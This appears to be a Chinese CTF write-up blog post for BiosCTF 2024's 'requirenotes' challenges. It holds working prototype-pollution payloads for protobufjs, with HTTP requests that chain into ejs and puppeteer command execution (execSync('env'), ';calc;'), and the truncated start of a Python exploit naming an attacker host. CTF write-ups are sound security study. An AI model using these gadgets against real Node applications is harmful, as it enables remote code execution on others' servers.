<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Squirt1e"><meta name="renderer" content="webkit"><meta name="copyright" content="Squirt1e"><meta name="keywords" content="Squirt1e's blog"><meta name="description" content="一名网络安全从业人员的博客"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Biosctf 2024 writeup · Squirt1e's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Squirt1e</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="http://114.67.236.137/pic/5634a4a770a0497be3f36bdc068c6f7.jpg" target="_black">美</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Squirt1e's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">Biosctf 2024 writeup</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2024-02-28</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="CTF"> CTF</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">3.3k</span> | Reading time: <span class="post-count">15</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h4 id="requirenotes"><a href="#requirenotes" class="headerlink" title="requirenotes"></a>requirenotes</h4><h5 id="非预期1"><a href="#非预期1" class="headerlink" title="非预期1"></a>非预期1</h5><p><code>protobufjs</code>有一个原型链污染，后面的<code>revenge</code>也有。</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># npm audit report</span>

protobufjs  7.0.0 - 7.2.3
Severity: critical
protobufjs Prototype Pollution vulnerability - https://github.com/advisories/GHSA-h755-8qp9-cq85
fix available via <span class="token variable"><span class="token variable">`</span><span class="token function">npm</span> audit fix --force<span class="token variable">`</span></span>
Will <span class="token function">install</span> protobufjs@7.2.6, <span class="token function">which</span> is outside the stated dependency range
node_modules/protobufjs
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>/create</code>下面正好有一个利用点<code>parse</code>，只要<code>settings.proto</code>可控就能原型链污染了。</p>
<pre class="line-numbers language-js"><code class="language-js">schema <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./settings.proto'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
root <span class="token operator">=</span> protobuf<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>schema<span class="token punctuation">)</span><span class="token punctuation">.</span>root<span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>而<code>/customise</code>正好能改<code>settings.proto</code>。<code>author</code>可控，直接在<code>author</code>那里污染写<code>payload</code>就行了。</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> <span class="token punctuation">{</span> data <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
<span class="token keyword">let</span> author <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'author'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>author<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    protoContents<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token string">`  </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>author<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> string author = 3 [default="user"];`</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'./settings.proto'</span><span class="token punctuation">,</span> protoContents<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>而<code>ejs compile</code>那里有个拼接，可以代码注入。关键在于<code>client</code>和<code>escapeFn</code>默认都是<code>null</code>，所以可以原型链污染覆盖这两个。</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>client<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  src <span class="token operator">=</span> <span class="token string">'escapeFn = escapeFn || '</span> <span class="token operator">+</span> escapeFn<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>compileDebug<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    src <span class="token operator">=</span> <span class="token string">'rethrow = rethrow || '</span> <span class="token operator">+</span> rethrow<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以第一次污染<code>client</code>，提交一下<code>note</code>触发污染。</p>
<pre class="line-numbers language-http"><code class="language-http">POST /customise HTTP/1.1
<span class="token header-name keyword">Host:</span> ch1581141629.ch.eng.run
<span class="token header-name keyword">Accept:</span> */*
<span class="token header-name keyword">Accept-Encoding:</span> identity
<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9
<span class="token header-name keyword">Content-Length:</span> 53
<span class="token header-name keyword">Content-Type:</span> application/json
<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36<span class="token application/json">

<span class="token punctuation">{</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span><span class="token string">"required"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"author"</span><span class="token punctuation">:</span><span class="token string">"option(a).constructor.prototype.client=1;\n required"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第二次污染<code>escapeFunction</code>，随便访问页面触发<code>ejs</code>渲染，没回显额外打个回显就行了。</p>
<pre class="line-numbers language-http"><code class="language-http">POST /customise HTTP/1.1
<span class="token header-name keyword">Host:</span> ch1581141629.ch.eng.run
<span class="token header-name keyword">Accept:</span> */*
<span class="token header-name keyword">Accept-Encoding:</span> identity
<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9
<span class="token header-name keyword">Content-Length:</span> 31
<span class="token header-name keyword">Content-Type:</span> application/json
<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36<span class="token application/json">

<span class="token punctuation">{</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span><span class="token string">"required"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"author"</span><span class="token punctuation">:</span><span class="token string">"option(a).constructor.prototype.escapeFunction=\"escapeFn;__output=global.process.mainModule.require('child_process').execSync('env').toString();return __output\";\n required"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1709104937652.png" alt="1709104937652"></p>
<p>PS：</p>
<p>这里<code>settings[&#39;view options&#39;]</code>如果存在的话会拷贝到<code>opts</code>中。但是<code>view options</code>这个<code>attribute</code>没办法污染，寄。调半天也没明白为啥不行，猜测是<code>protobuf.js</code>解析的时候发现有空格就认为是赋值操作？不过这种带空格的属性不加单引号估计不太可能污染的上。</p>
<pre class="line-numbers language-js"><code class="language-js">viewOpts <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view options'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>viewOpts<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  utils<span class="token punctuation">.</span><span class="token function">shallowCopy</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> viewOpts<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="非预期2"><a href="#非预期2" class="headerlink" title="非预期2"></a>非预期2</h5><p>污染<code>_peername.address</code>可以让我们访问<code>search</code>路由，这就很神奇。</p>
<pre><code>option(a).constructor.prototype._peername.address = \&quot;127.0.0.1\&quot;
</code></pre>
<p>之后爆破就完事了。</p>
<h4 id="requirenotes-revenge"><a href="#requirenotes-revenge" class="headerlink" title="requirenotes-revenge"></a>requirenotes-revenge</h4><h5 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h5><p><code>revenge</code>也被非预期<code>RCE</code>了，其中<code>revenge</code>修了<code>ejs</code>模版渲染<code>RCE</code>那条<code>gadget</code>。</p>
<p><code>patch</code>（仅针对于<code>ejs</code>）挺顶级的，这下也没办法污染<code>escapeFunction</code>了。</p>
<pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'view options'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
  client<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> 
  escapeFunction<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> html<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[&amp;&lt;>"']/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>match<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token punctuation">{</span>
        <span class="token string">'&amp;'</span><span class="token punctuation">:</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">,</span>
        <span class="token string">'&lt;'</span><span class="token punctuation">:</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">,</span>
        <span class="token string">'>'</span><span class="token punctuation">:</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">,</span>
        <span class="token string">'"'</span><span class="token punctuation">:</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">,</span>
        <span class="token string">"'"</span><span class="token punctuation">:</span> <span class="token string">'&amp;#39;'</span>
      <span class="token punctuation">}</span><span class="token punctuation">[</span>match<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> 
  escape<span class="token punctuation">:</span> <span class="token boolean">false</span> 
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>还限制了长度和字符。</p>
<pre class="line-numbers language-js"><code class="language-js">  <span class="token keyword">if</span> <span class="token punctuation">(</span>author<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">86</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal server error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex">/^[A-Za-z0-9/."\\(){};=]+$/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>author<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> Message<span class="token punctuation">:</span> <span class="token string">'Internal server error'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看样子<code>ejs</code>这条路走不通了，不过老外哥找出了一条<code>puppetter RCE gadget</code>。感觉还挺通用的，现在国外<code>XSS</code>都是<code>puppeter</code>。其实意会一下就知道<code>puppeteer</code>启动<code>chrome</code>肯定得执行命令，类似<code>spawn execSync</code>这种，所以应该是能找到一点机会。</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'puppeteer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">healthCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    headless<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    args<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">]</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> response<span class="token operator">=</span><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000/view/Healthcheck"</span><span class="token punctuation">)</span>
  <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span> healthCheck <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>launch</code>最终会调用<code>spawn</code>，这里<code>executablePath</code>无所谓，因为我们是打命令注入，这里爱执行啥执行啥。重点在于<code>this.#args</code>。</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>#browserProcess <span class="token operator">=</span> child_process_1<span class="token punctuation">.</span><span class="token keyword">default</span><span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>#executablePath<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>#args<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    detached<span class="token punctuation">:</span> opts<span class="token punctuation">.</span>detached<span class="token punctuation">,</span>
    env<span class="token punctuation">:</span> opts<span class="token punctuation">.</span>env<span class="token punctuation">,</span>
    stdio<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash"><code class="language-bash">Process <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\@puppeteer\browsers\lib\cjs\launch.js:107<span class="token punctuation">)</span>
launch <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\@puppeteer\browsers\lib\cjs\launch.js:60<span class="token punctuation">)</span>
launch <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\puppeteer-core\lib\cjs\puppeteer\node\ProductLauncher.js:86<span class="token punctuation">)</span>
await <span class="token punctuation">(</span>Unknown Source:0<span class="token punctuation">)</span>
launch <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\puppeteer-core\lib\cjs\puppeteer\node\ChromeLauncher.js:51<span class="token punctuation">)</span>
launch <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\node_modules\puppeteer-core\lib\cjs\puppeteer\node\PuppeteerNode.js:142<span class="token punctuation">)</span>
healthCheck <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\bot.js:4<span class="token punctuation">)</span>
<span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>e:\ctf\bios2024\requirednotesrevenge\src\index.js:235<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>args</code>我们可以通过<code>lanunch</code>声明。</p>
<pre class="line-numbers language-js"><code class="language-js">  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    headless<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    args<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">]</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>debug</code>看看里面的逻辑，发现最终会触发到<code>ChromeLauncher.js#computeLaunchArguments</code>。</p>
<p>该函数声明了一堆未定义常量，<code>options</code>就是我们传进来的<code>&#123;     headless: true,     args:[&#39;--no-sandbox&#39;]   &#125;</code>了。</p>
<p><code>debuggingPort, channel, executablePath</code>默认都为空。</p>
<pre class="line-numbers language-js"><code class="language-js">    <span class="token keyword">async</span> <span class="token function">computeLaunchArguments</span><span class="token punctuation">(</span>options <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> <span class="token punctuation">{</span> ignoreDefaultArgs <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pipe <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">,</span> debuggingPort<span class="token punctuation">,</span> channel<span class="token punctuation">,</span> executablePath<span class="token punctuation">,</span> <span class="token punctuation">}</span> <span class="token operator">=</span> options<span class="token punctuation">;</span>
        <span class="token keyword">const</span> chromeArguments <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ignoreDefaultArgs<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            chromeArguments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">defaultArgs</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment" spellcheck="true">//...</span>
    <span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到<code>pipe=false</code>时，会把<code>debuggingPort</code>赋值给<code>--remote-debugging-port</code>，那么这里原型链污染<code>debuggingPort</code>就可以了。类似<code>;whoami;</code>这样命令注入即可。</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>pipe<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> assert_js_1<span class="token punctuation">.</span>assert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">!</span>debuggingPort<span class="token punctuation">,</span> <span class="token string">'Browser should be launched with either pipe or debugging port - not both.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chromeArguments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'--remote-debugging-pipe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
    chromeArguments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`--remote-debugging-port=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>debuggingPort <span class="token operator">||</span> <span class="token number">0</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那么还有别的污染选择吗？看到当<code>ignoreDefaultArgs</code>为<code>false</code>时，会调用<code>this.defaultArgs(options)</code>。污染<code>userDataDir</code>也可以。</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>userDataDir<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    chromeArguments<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`--user-data-dir=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path_1<span class="token punctuation">.</span><span class="token keyword">default</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>userDataDir<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>此外，我们还需要设置<code>options.shell=sh</code>，即在 <code>sh</code> 中运行命令，不过注意只需污染一次。</p>
<p>另外污染<code>debuggingPort</code>是要比<code>userDataDir</code>更通用的，因为给用户数据目录赋值时会调用<code>path_1.default.resolve</code>，碰到数组会直接抛出异常。因此使用<code>userDataDir</code>需要做到一击必杀，即只有执行一次命令的机会。</p>
<p>而<code>debuggingPort</code>就没通过函数解析，所以我们无需担心类型转换问题。赋值<code>option(a).constructor.prototype.debuggingPort=&quot;;calc;a=&quot;</code>即可。</p>
<p><strong>exploit</strong></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> httpx

BASE_URL <span class="token operator">=</span> <span class="token string">"http://localhost:3000"</span>

ATTACKER_HOST <span class="token operator">=</span> <span class="token string">"evil.example.com"</span>

client <span class="token operator">=</span> httpx<span class="token punctuation">.</span>Client<span class="token punctuation">(</span>base_url<span class="token operator">=</span>BASE_URL<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">pp</span><span class="token punctuation">(</span>key<span class="token punctuation">:</span> str<span class="token punctuation">,</span> value<span class="token punctuation">:</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    author <span class="token operator">=</span> <span class="token string">"option(a).constructor.prototype."</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">""</span>
    <span class="token keyword">assert</span> len<span class="token punctuation">(</span>author<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>author<span class="token punctuation">,</span> len<span class="token punctuation">(</span>author<span class="token punctuation">)</span><span class="token punctuation">]</span>
    res <span class="token operator">=</span> client<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
        <span class="token string">"/customise"</span><span class="token punctuation">,</span>
